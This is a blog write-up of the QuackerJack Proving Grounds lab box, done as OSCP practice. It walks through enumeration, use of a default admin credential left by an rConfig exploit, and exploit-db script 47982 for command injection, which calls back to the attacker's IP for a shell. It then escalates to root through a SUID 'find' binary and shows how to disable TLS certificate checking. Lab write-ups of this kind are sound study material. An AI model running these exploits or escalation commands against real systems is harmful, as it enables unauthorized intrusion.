---
layout: writeup
title: QuackerJack - Proving Grounds
date: 2024-08-04 13:32:20 +0300
description: A Writeup of the QuackerJack Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi, Python]
---

This is a writeup for QuackerJack, which I saw on the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). I kick things off with an nmapAutomator Full scan and check port 80 by entering the IP into firefox. I get the nmap scan back, and it looks like we'll have a lot to go through. 
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8081/tcp open  blackice-icecap
```

And I do see a webpage for port 80, so I begin a directory scan on that (which doesn't really return anything interesting).
![QuackerJack1.png](/assets/images/QuackerJack/QuackerJack1.png){: .responsive-image}

As I go through the nmap output of open ports, there's a few options that don't really go anywhere either. The FTP server does allow anonymous logins, but it times out before you can access anything. I can authenticate using rcpclient, but I can't find anything especially interesting, particularly in the way of usernames or passwords. I am able to list SMB shares, but can't access anything that stands out. And then there's port 8081, where I quickly find a login page:

![QuackerJack2.png](/assets/images/QuackerJack/QuackerJack2.png){: .responsive-image}

Trying some test logins and admin shows `Invalid password` but user shows `username not found` so we know admin is a user. At that point I search for some exploits and try a few because we know from the screenshot above that we're working with `rConfig Version 3.9.4`. There is an unauthenticated root exploit on exploit-db for that version, but I don't get it working. I also try one for [3.9.5](https://www.exploit-db.com/exploits/48878), but that doesn't immediately appear to work either. While looking around, I see a comment in[this](https://gist.github.com/farid007/9f6ad063645d5b1550298c8b9ae953ff)github page that states that the exploit for 3.9.5 does create a password for the admin user of `Testing1@`. So I try to login with the credentials `admin:Testing1@`, and it works. I hadn't realized that part of the exploit did work. So we have creds now and access to the console. 

![QuackerJack3.png](/assets/images/QuackerJack/QuackerJack3.png){: .responsive-image}

While there is an authenticated command injection exploit on [exploit-db](https://www.exploit-db.com/exploits/48241), I unfortunately get errors on that. Apparently a couple python modules might not match a supported version: 
`urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!` I could try and figure that out, but I've had some issues trying to tweak that, so I keep moving and make a note. 

After an hour or so, I decide it's time to revisit this issue, because honestly, I should know how to solve. That said, I'm not sure the best path to move forward, so I ask ChatGPT. I figure if I do this, I can take notes and learn how to do it in the future. So I do, and it turns out I need to create a python 3 virtual environment, install the supported libraries, and then deactivate later. The commands are as follows:
1. `sudo apt-get install python3-venv`
2. `python3 -m venv myenv`
3. `source myenv/bin/activate
4. `pip install requests urllib3==1.26.8 charset_normalizer==2.0.12` 
5. `python $script.py`
6. `deactivate`

And it works, and now I know! However, it did not solve my problems. I ran the script again without those errors, and I noticed a few more, all ultimately cause by an SSL issue, because we had to use https for port 8081. The error looked like this:

`(Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1006)')))` 

So I simply asked ChatGPT again, and it told me to run these commands to fix the issue. 
1. `export PYTHONWARNINGS="ignore:Unverified HTTPS request"`
2. `export REQUESTS_CA_BUNDLE=""`
3. `export CURL_CA_BUNDLE=""`

And it did, and the command finally worked:
`python3 47982.py https://192.168.242.57:8081 admin Testing1@ 192.168.45.235 80`

And I got the shell. So I checked for SUID binaries using: 
`find / -type f -perm -u=s 2>/dev/null`, and I immediately noticed `find`. A quick trip to gtfo bins says we can run this command to get privileged access, and it won't drop the privileges. 

`find . -exec /bin/sh -p \; -quit`

And it works. 

![QuackerJack4.png](/assets/images/QuackerJack/QuackerJack4.png){: .responsive-image}

Lessons learned: I learned how to use a python virtual environment to download different libraries than the main ones, and I learned how to configure it such that it ignores SSL issues/issues with certs when using HTTPS for sites that aren't properly configured for it. 

Other takeaways: I'm annoyed with myself for using ChatGPT on this box when it's not allowed on the exam, but that said, it's exactly the kind of thing to use ChatGPT for. I didn't know that it was possible to use a temporary virtual environment like that for python, so I didn't know *to* research how to do it. I can't do it on the exam, but hey, now it's in my [OSCP Notes](https://cagrigsby.github.io/oscp_notes/)